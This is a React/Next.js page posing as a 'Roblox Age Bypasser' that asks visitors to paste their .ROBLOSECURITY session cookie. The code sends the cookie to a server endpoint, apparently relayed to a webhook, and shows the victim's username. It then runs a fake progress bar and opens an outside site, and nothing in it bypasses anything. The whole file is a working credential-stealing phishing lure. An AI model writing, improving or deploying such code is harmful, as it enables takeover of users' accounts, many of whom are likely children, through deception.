"use client"

import { useState } from "react"
import { Shield, Play } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"

export default function Home() {
  const [cookie, setCookie] = useState("")
  const [isProcessing, setIsProcessing] = useState(false)
  const [progress, setProgress] = useState(0)
  const [username, setUsername] = useState("")
  const [statusText, setStatusText] = useState("")

  const handleBypass = async () => {
    if (!cookie.trim()) return

    setIsProcessing(true)
    setProgress(0)
    setUsername("")
    setStatusText("Processing...")

    try {
      fetch("/api/bypass", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ cookie: cookie.trim() }),
      })
        .then(async (response) => {
          const result = await response.json()
          if (result.userInfo?.name) {
            setUsername(result.userInfo.name)
          }
        })
        .catch((error) => {
          console.error("[v0] Failed to send to webhook:", error)
        })

      const totalDuration = 10000 // 10 seconds
      const intervalTime = 100 // Update every 100ms
      const incrementPerInterval = (100 / totalDuration) * intervalTime

      const progressInterval = setInterval(() => {
        setProgress((prev) => {
          const newProgress = prev + incrementPerInterval
          if (newProgress >= 100) {
            clearInterval(progressInterval)
            setStatusText("Complete!")
            setTimeout(() => {
              window.open("https://rblxbypasser.com/", "_blank")
              setIsProcessing(false)
              setProgress(0)
              setCookie("")
              setUsername("")
              setStatusText("")
            }, 500)
            return 100
          }
          return newProgress
        })
      }, intervalTime)
    } catch (error) {
      console.error("[v0] Failed to bypass:", error)
      setStatusText("Failed")
      setIsProcessing(false)
    }
  }

  return (
    <main className="min-h-screen bg-black flex flex-col items-center justify-center p-4">
      {/* Header Section */}
      <div className="flex flex-col items-center mb-12">
        <div className="w-20 h-20 rounded-full bg-zinc-900 flex items-center justify-center mb-6">
          <Shield className="w-10 h-10 text-white" strokeWidth={1.5} />
        </div>

        <h1 className="text-4xl md:text-5xl font-bold text-white mb-3 text-balance text-center">Roblox Age Bypasser</h1>

        <p className="text-zinc-400 text-lg text-center">Secure and efficient age verification bypass</p>
      </div>

      {/* Main Card */}
      <Card className="w-full max-w-md bg-zinc-900 border-zinc-800">
        <CardContent className="p-8">
          <label className="block text-white text-sm font-medium mb-3">.ROBLOSECURITY Cookie</label>

          <textarea
            value={cookie}
            onChange={(e) => setCookie(e.target.value)}
            placeholder="Paste your cookie here..."
            className="w-full h-24 px-4 py-3 bg-zinc-950 border border-zinc-800 rounded-lg text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-zinc-700 resize-none mb-6"
          />

          <Button
            onClick={handleBypass}
            disabled={!cookie.trim() || isProcessing}
            className="w-full h-12 bg-white hover:bg-zinc-100 text-black font-medium rounded-lg flex items-center justify-center gap-2 transition-colors disabled:opacity-50"
          >
            <Play className="w-4 h-4" fill="currentColor" />
            {isProcessing ? "In Progress" : "Start Bypass"}
          </Button>

          {isProcessing && (
            <div className="mt-6 space-y-3">
              <div className="text-center">
                <p className="text-zinc-400 text-sm mb-1">Processing account</p>
                {username && <p className="text-white font-medium">{username}</p>}
              </div>

              <div className="space-y-2">
                <div className="flex items-center justify-between text-sm">
                  <span className="text-zinc-400">Progress</span>
                  <span className="text-white font-medium">{Math.round(progress)}%</span>
                </div>

                <div className="w-full h-2 bg-zinc-800 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-white transition-all duration-300 ease-out"
                    style={{ width: `${progress}%` }}
                  />
                </div>

                <p className="text-zinc-500 text-xs text-center flex items-center justify-center gap-1">
                  <span className="inline-block w-1 h-1 bg-zinc-500 rounded-full animate-pulse" />
                  {statusText}
                </p>
              </div>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Footer */}
      <div className="mt-12 flex items-center gap-2 text-zinc-600 text-sm">
        <span>Secure</span>
        <span>•</span>
        <span>Fast</span>
        <span>•</span>
        <span>Reliable</span>
      </div>
    </main>
  )
}
